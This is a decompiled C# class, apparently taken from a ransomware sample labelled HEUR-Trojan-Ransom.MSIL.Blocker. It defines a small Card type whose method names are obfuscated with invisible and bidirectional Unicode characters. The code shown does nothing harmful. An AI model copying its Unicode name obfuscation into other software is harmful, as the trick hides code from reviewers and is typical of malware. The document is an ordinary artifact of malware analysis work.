// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Card
// Assembly: SZGenericArrayEnumerat, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: E834FD24-872B-47C0-BFE1-9B14E3D5CFBB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-8c16cbf4df8137db774d2cb97cc386b052ca7a0b77ee1572fe7a5fc9a5a22ae0.exe

using System;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Card
  {
    public static readonly string[] CardTypeNames = new string[5]
    {
      "F",
      "M",
      "T",
      "C",
      "E"
    };
    public const int EconomicsIndex = 4;
    public int Type;
    public int Impact;

    public override string ToString() => Card.\u200B⁯⁮‪‏⁬‫⁮‍‬⁬‏​⁯‫⁪​‏⁬‌‍‏⁭‌⁭‮‫‮⁭‌⁫‭‏‪‮‭‌‎‍‌‮("{0}{1}{2}", (object) Card.CardTypeNames[this.Type], this.Impact < 0 ? (object) "G" : (object) "B", (object) Card.\u202E‪‏⁮‮⁪⁪‫⁪‌‫‭⁪‏⁬‪‭⁭​⁭⁪⁮‭⁪⁯⁫‌‫⁭⁪‭‍​‮⁭‎‪‭⁬‌‮(this.Impact));

    static int \u202E‪‏⁮‮⁪⁪‫⁪‌‫‭⁪‏⁬‪‭⁭​⁭⁪⁮‭⁪⁯⁫‌‫⁭⁪‭‍​‮⁭‎‪‭⁬‌‮([In] int obj0) => Math.Abs(obj0);

    static string \u200B⁯⁮‪‏⁬‫⁮‍‬⁬‏​⁯‫⁪​‏⁬‌‍‏⁭‌⁭‮‫‮⁭‌⁫‭‏‪‮‭‌‎‍‌‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
